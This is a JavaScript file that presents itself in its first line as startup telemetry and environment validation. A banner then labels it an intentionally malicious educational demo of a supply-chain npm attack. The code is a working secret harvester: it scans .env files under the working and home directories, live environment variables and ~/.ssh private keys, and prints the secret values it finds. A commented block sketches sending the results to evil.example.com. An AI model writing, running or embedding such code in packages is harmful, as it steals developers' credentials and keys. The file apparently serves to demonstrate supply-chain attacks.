// Initializes telemetry and environment validation on startup.
// ============================================================
// EDUCATIONAL DEMO — Supply-chain / malicious-package attack
//
// This file is intentionally malicious to demonstrate what a
// real attacker would ship inside an npm package or a repo that
// looks innocent.  It scans for secrets and prints them.
//
// Do NOT use this against systems you do not own.
// ============================================================

"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");

// ── helpers ─────────────────────────────────────────────────

const BENIGN_NAMES = new Set([
    "PATH",
    "HOME",
    "USER",
    "SHELL",
    "TERM",
    "PWD",
    "LANG",
    "LANGUAGE",
    "SHLVL",
    "OLDPWD",
    "LOGNAME",
    "DISPLAY",
    "COLORTERM",
    "LS_COLORS",
    "LESSOPEN",
    "LESSCLOSE",
    "PAGER",
    "EDITOR",
    "VISUAL",
    "MANPATH",
    "XDG_RUNTIME_DIR",
    "XDG_SESSION_TYPE",
    "DBUS_SESSION_BUS_ADDRESS",
    "TERM_PROGRAM",
    "TERM_PROGRAM_VERSION",
    "TERM_SESSION_ID",
    "SSH_AUTH_SOCK",
    "SSH_TTY",
    "SSH_CLIENT",
    "SSH_CONNECTION",
    "_",
]);

const SENSITIVE_NAME_RE =
    /secret|password|passwd|api[_-]?key|private[_-]?key|access[_-]?key|access[_-]?secret|auth[_-]?token|credential|db[_-]pass|db[_-]url|database[_-]url|dsn|stripe|twilio|sendgrid|aws[_-]|gcp[_-]|azure[_-]|github[_-]token|slack[_-]token|webhook[_-]secret/i;

function isSensitiveName(name) {
    if (BENIGN_NAMES.has(name)) return false;
    return SENSITIVE_NAME_RE.test(name);
}

function isSensitiveValue(value) {
    if (!value || value.length < 16) return false;
    if (value.includes("/") || value.includes(":") || value.includes(" "))
        return false;
    return (
        /^[A-Za-z0-9_-]{20,}$/.test(value) ||
        /^[A-Za-z0-9+/]{20,}={0,2}$/.test(value)
    );
}

const findings = [];

function report(type, name, value, source) {
    findings.push({ type, name, value, source });
}

// ── 1. Parse a .env / .envrc style file ─────────────────────

function parseEnvFile(filePath) {
    let content;
    try {
        content = fs.readFileSync(filePath, "utf8");
    } catch {
        return;
    }

    for (const rawLine of content.split("\n")) {
        const line = rawLine.trim().replace(/^export\s+/, "");
        if (!line || line.startsWith("#")) continue;

        const eq = line.indexOf("=");
        if (eq === -1) continue;

        const name = line.slice(0, eq).trim();
        const value = line
            .slice(eq + 1)
            .trim()
            .replace(/^["']|["']$/g, "");

        if (isSensitiveName(name) || isSensitiveValue(value)) {
            report("env file var", name, value, filePath);
        }
    }
}

// ── 2. Walk directory tree looking for env files ─────────────

// Directories that are either too large or guaranteed to have no .env files
const SKIP_DIRS = new Set([
    ".git",
    ".svn",
    ".hg",
    "node_modules",
    ".pnp",
    ".cache",
    ".npm",
    ".yarn",
    ".nvm",
    ".asdf",
    ".rbenv",
    ".pyenv",
    ".local",
    ".config",
    ".cursor",
    ".codex",
    ".claude",
    ".gemini",
    "Library",
    "Applications", // macOS
    "proc",
    "sys",
    "dev", // Linux pseudo-fs
]);

const ENV_FILE_NAMES = new Set([
    ".env",
    ".envrc",
    ".env.local",
    ".env.development",
    ".env.development.local",
    ".env.production",
    ".env.production.local",
    ".env.staging",
    ".env.test",
    ".env.test.local",
]);

function walkForEnvFiles(dir, depth = 0, maxDepth = 4) {
    if (depth > maxDepth) return;
    let entries;
    try {
        entries = fs.readdirSync(dir, { withFileTypes: true });
    } catch {
        return;
    }

    for (const entry of entries) {
        if (SKIP_DIRS.has(entry.name)) continue;

        const full = path.join(dir, entry.name);

        if (entry.isDirectory()) {
            walkForEnvFiles(full, depth + 1, maxDepth);
        } else if (
            ENV_FILE_NAMES.has(entry.name) ||
            /^\.env(\..+)?$/.test(entry.name)
        ) {
            parseEnvFile(full);
        }
    }
}

// ── 3. Scan live process.env ─────────────────────────────────

function scanProcessEnv() {
    for (const [name, value] of Object.entries(process.env)) {
        if (isSensitiveName(name) || isSensitiveValue(value || "")) {
            report("process.env", name, value || "", "process.env");
        }
    }
}

// ── 4. Scan ~/.ssh for private keys ─────────────────────────

const PRIVATE_KEY_HEADER_RE =
    /-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----/;
const SSH_NON_KEY_FILES = new Set([
    "known_hosts",
    "authorized_keys",
    "config",
    "environment",
]);

function scanSSHDir() {
    const sshDir = path.join(os.homedir(), ".ssh");
    let entries;
    try {
        entries = fs.readdirSync(sshDir, { withFileTypes: true });
    } catch {
        return;
    }

    for (const entry of entries) {
        if (!entry.isFile()) continue;
        if (entry.name.endsWith(".pub")) continue;
        if (SSH_NON_KEY_FILES.has(entry.name)) continue;

        const full = path.join(sshDir, entry.name);
        let content;
        try {
            content = fs.readFileSync(full, "utf8");
        } catch {
            continue;
        }

        if (PRIVATE_KEY_HEADER_RE.test(content)) {
            const header = content.split("\n")[0].trim();
            report(
                "SSH private key",
                entry.name,
                header + " [key body redacted in demo]",
                full,
            );
        }
    }
}

// ── Run ──────────────────────────────────────────────────────

walkForEnvFiles(process.cwd());
walkForEnvFiles(os.homedir());
scanProcessEnv();
scanSSHDir();

// ── Deduplicate & print ──────────────────────────────────────

const seen = new Set();
const unique = findings.filter((f) => {
    const key = `${f.type}|${f.name}|${f.source}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
});

if (unique.length > 0) {
    console.log("\n\x1b[31m\x1b[1m🚨  You have been pwned, I stole:\x1b[0m\n");

    for (const f of unique) {
        console.log(
            `  \x1b[33m[${f.type}]\x1b[0m  \x1b[36m${f.name}\x1b[0m = \x1b[31m${f.value}\x1b[0m`,
        );
        console.log(`         └─ found in: \x1b[2m${f.source}\x1b[0m\n`);
    }

    // In a real attack this is where you'd POST findings to an attacker-controlled server:
    //
    //   const https = require('https');
    //   const req = https.request({ hostname: 'evil.example.com', path: '/collect', method: 'POST', ... });
    //   req.write(JSON.stringify(unique));
    //   req.end();
}
